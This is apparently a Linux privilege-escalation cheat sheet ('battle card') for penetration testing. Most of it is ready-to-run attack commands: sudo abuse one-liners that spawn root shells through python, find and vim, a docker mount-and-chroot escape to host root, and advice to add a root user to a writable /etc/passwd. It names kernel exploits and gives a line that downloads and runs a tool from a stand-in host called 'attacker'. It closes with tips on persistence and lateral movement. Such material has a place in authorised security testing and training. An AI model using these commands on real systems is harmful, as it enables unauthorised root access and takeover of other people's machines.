# Linux PrivEsc Battle Card

## What to Check First
```
1. sudo -l                  → Sudo permissions (ALWAYS FIRST)
2. id                       → Current user/group membership
3. uname -a                 → Kernel version for exploit
4. ls -la /etc/passwd       → Writable passwd/shadow
5. cat /etc/crontab         → Cron jobs
```

## High-Value Findings
- **ALL sudo entries** (NOPASSWD especially) → Immediate priv escalation
- **SUID binaries** → /usr/bin/pkexec, python, perl, find, nmap
- **Cron jobs as root** → Wildcard, writable script, PATH abuse
- **Writable /etc/passwd** → Add root user → su newroot
- **Writable /etc/shadow** → Change root password → su
- **Kernel exploit** → DirtyPipe, OverlayFS, PwnKit
- **Docker group membership** → Docker socket → Host root
- **Capabilities** → cap_setuid+ep → Privesc tools
- **Backup files** → SSH keys, DB dumps
- **SUDO environment** → LD_PRELOAD, PYTHONPATH abuse

## Immediate Commands
```
# Automated enumeration
linpeas.sh | tee linpeas.log
./linenum.sh | tee linenum.log

# Manual (parallel)
sudo -l 2>/dev/null | tee sudo-check.txt
find / -perm -4000 2>/dev/null | tee suid.txt
cat /etc/crontab 2>/dev/null
ls -la /etc/cron* 2>/dev/null

# SUID abuse
find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null
find / -perm -4000 -type f -a \( -name "python*" -o -name "find" -o -name "nmap" -o -name "vim*" -o -name "bash" \) 2>/dev/null

# Sudo abuse examples
sudo -u root /usr/bin/python -c 'import os; os.system("/bin/bash")'
sudo /usr/bin/find . -exec /bin/sh \; -quit
sudo /usr/bin/vim -c ':!bash'

# Check writable files
find / -writable -type f 2>/dev/null | grep -v proc | grep -v sys
find / -writable -type d 2>/dev/null | grep -v proc | grep -v sys

# Kernel exploits
searchsploit "linux kernel $(uname -r | cut -d- -f1) privesc"
uname -a | tee kernel-version.txt

# Cron checking
cat /etc/crontab
cat /etc/cron.d/* 2>/dev/null
cat /var/spool/cron/crontabs/* 2>/dev/null
grep -r CRON /var/log/syslog 2>/dev/null

# Docker check
docker ps 2>/dev/null && echo "Docker group!" || echo "No docker"
# Mount docker socket
docker run -v /:/mnt -it alpine chroot /mnt /bin/sh

# Check capabilities
getcap -r / 2>/dev/null

# Pspy for timed processes
wget attacker/pspy64 && chmod +x pspy64 && ./pspy64
```

## Common Attack Paths
```
SUDO NOPASSWD → /usr/bin/python → Root Shell
SUID BINARY → python/perl/find → Root Shell
CRON JOB (ROOT) → Writable Script → Modify → Root Execution
WRITABLE PASSWD → openssl passwd → Add Root → su
DOCKER GROUP → Docker Socket → Mount Host → chroot → Root
KERNEL EXPLOIT → DirtyPipe/PwnKit → Root Shell
CAP_SETUID → python cap → os.setuid(0) → Root
```

## Escalation Paths
- **Sudo ALL** → `sudo -i` → Root
- **Sudo specific binary** → GTFO bins → Root
- **SUID binary** → GTFO bins → Root
- **Cron root script** → Replace/append → Root execution
- **Docker** → Mount root FS → Full host control
- **Writable PATH** → PATH hijack → Next cron execute

## When to Stop
- linpeas returns nothing after full review
- No sudo, no SUID, no cron, no writable system files
- Move to lateral movement or pivot to find creds elsewhere

## Common Mistakes
- Not checking `sudo -l` before anything else
- Running linpeas but not reviewing output carefully
- Missing cron jobs in /etc/cron.d/ and /var/spool/cron/
- Not checking PS aux for running processes as root
- Ignoring group membership (docker, lxd, disk, video)
- Not checking writable .bashrc/.profile (persistence for next login)
- Only checking regular SUID, missing capabilities (getcap -r /)
- Forgetting to upload pspy for timed cron jobs
